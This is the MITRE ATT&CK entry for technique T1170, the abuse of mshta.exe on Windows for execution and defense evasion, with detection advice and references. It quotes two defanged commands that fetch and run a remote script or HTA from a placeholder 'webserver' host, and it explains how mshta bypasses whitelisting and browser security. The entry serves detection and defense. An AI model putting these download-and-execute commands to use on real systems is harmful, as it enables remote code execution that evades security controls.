---
contributors:
- Ricardo Dias
- Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank
id: attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec
mitre_attack_url: https://attack.mitre.org/techniques/T1170
name: Mshta
platforms:
- Windows
tactics:
- defense-evasion
- execution
title: defense-evasion - Mshta
---

## Technical Details

| Attribute | Details |
|-----------|----------|
| **Tactics** | defense-evasion, execution |
| **Platforms** | Windows |
| **Permissions Required** | User |
| **MITRE ATT&CK URL** | [https://attack.mitre.org/techniques/T1170](https://attack.mitre.org/techniques/T1170) |

# Mshta (attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec)

## Description
Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)

## Detection
Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.

## External References
- [mitre-attack](https://attack.mitre.org/techniques/T1170)
- [Wikipedia HTML Application](https://en.wikipedia.org/wiki/HTML_Application)
- [MSDN HTML Applications](https://msdn.microsoft.com/library/ms536471.aspx)
- [Cylance Dust Storm](https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf)
- [Red Canary HTA Abuse Part Deux](https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/)
- [FireEye Attacks Leveraging HTA](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)
- [Airbus Security Kovter Analysis](https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/)
- [FireEye FIN7 April 2017](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)
- [LOLBAS Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
